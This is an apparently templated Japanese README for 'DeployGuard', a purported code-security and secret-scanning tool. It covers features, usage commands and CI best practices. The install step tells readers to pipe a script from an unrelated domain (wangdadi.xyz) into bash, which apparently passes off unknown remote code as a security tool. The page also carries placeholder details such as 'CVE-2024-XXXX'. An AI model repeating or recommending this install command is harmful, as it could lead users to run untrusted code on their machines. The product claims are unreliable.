# deployguard - DEP_008

## 概要

DeployGuard は、コードセキュリティ監査・静的解析に特化したソロ開発者向けプロフェッショナルツールです。プッシュ前の脆弱性検出、依存関係の自動検証、デプロイフックとの統合により、CI/CD パイプラインにセキュリティゲートを追加します。キーワード：Code Security Audit, Solo Developer Tools, Static Analysis Tool

## 詳細な内容

### DeployGuard とは？

DeployGuard は、デプロイ前にコードベース全体をスキャンし、OWASP Top 10 に基づく脆弱性、シークレット漏洩、非推奨ライブラリの使用を検出する静的解析エンジンです。`pre-commit` フックや GitHub Actions とシームレスに統合し、マージ前にブロックします。特にソロ開発者向けに最適化されており、低フットプリントで高速動作します。

### コア機能

- **リアルタイムシークレットスキャン（`--secret-detect`）**  
  コミット前に `.env` や設定ファイル内の API キー、トークン、秘密鍵を検出。`regex` ベースのパターンマッチング（例：`/^[A-Za-z0-9_-]{20,40}$/`）に加え、エントロピー解析（閾値：4.5 以上）で未知のパターンも特定。検出時は `exit code 1` で即時ブロック。スキャン速度：平均 200 ファイル/秒（SSD 上）。

- **依存関係脆弱性データベース連携（`--dep-audit`）**  
  npm、PyPI、RubyGems のロックファイルを解析し、公開脆弱性データベース（NVD、GitHub Advisory）と照合。`package-lock.json` や `Gemfile.lock` のハッシュ値を検証し、`CVE-2024-XXXX` 形式でレポート。PostgreSQL にキャッシュされた脆弱性情報を利用し、オフラインでも過去 30 日分のデータを保持。

- **カスタムポリシーエンジン（`.deployguard.yml`）**  
  プロジェクトルートに配置した YAML 設定ファイルで、許可/禁止ルールを定義。例：`block_secrets: true`、`allowed_licenses: ["MIT", "Apache-2.0"]`、`max_critical_vulns: 0`。ルール違反時は `--fail-on` フラグで重大度（critical, high, medium）を指定可能。ポリシーはマージ前に自動評価され、結果は JSON または HTML 形式で出力。

### 使い方

1. **インストールと初期設定**  
   ```bash
   curl -sSL https://www.wangdadi.xyz/?utm_source=github | bash -s -- --install
   # または Homebrew: brew tap deployguard/tap && brew install deployguard
   ```
   インストール後、プロジェクトルートで `deployguard init` を実行。`.deployguard.yml` が生成され、`git config core.hooksPath .githooks` で pre-commit フックが自動設定される。

2. **プルリクエスト前のスキャン実行**  
   ```bash
   deployguard scan --secret-detect --dep-audit --fail-on high --output report.html
   ```
   スキャン結果は `report.html` に出力。`--fail-on high` により、high 以上の脆弱性がある場合は `exit code 1` で終了。CI パイプライン（例：GitHub Actions）では `if: failure()` で自動的に PR をブロック。

3. **カスタムポリシーの適用とレポート確認**  
   ```bash
   deployguard policy --apply .deployguard.yml --verbose
   ```
   ポリシー違反が検出された場合、`deployguard report --format json` で詳細な結果を取得。`--since` フラグで前回スキャンからの差分のみ表示可能（例：`--since 2024-01-01`）。PostgreSQL に保存された履歴と比較し、新たに追加された脆弱性を強調表示。

### ベストプラクティス

- **プルリクエストテンプレートにスキャン結果を埋め込む**  
  GitHub Actions や GitLab CI で `deployguard scan --output markdown` を実行し、結果を PR コメントとして自動投稿。レビュアーがコードレビュー前にセキュリティ状態を把握でき、マージ判断の効率が向上。特にソロ開発者にとって、セルフレビューの質を高める有効な手段。

- **週次スケジュールで全依存関係の更新チェック**  
  `cron` ジョブ（例：毎週月曜 9:00 JST）で `deployguard refresh --dep-audit` を実行。PostgreSQL にキャッシュされた脆弱性データベースを更新し、`deployguard scan --since 7days` で新たな脆弱性のみを通知。これにより、依存関係の更新頻度を最小限に抑えつつ、重大な脆弱性を見逃さない。
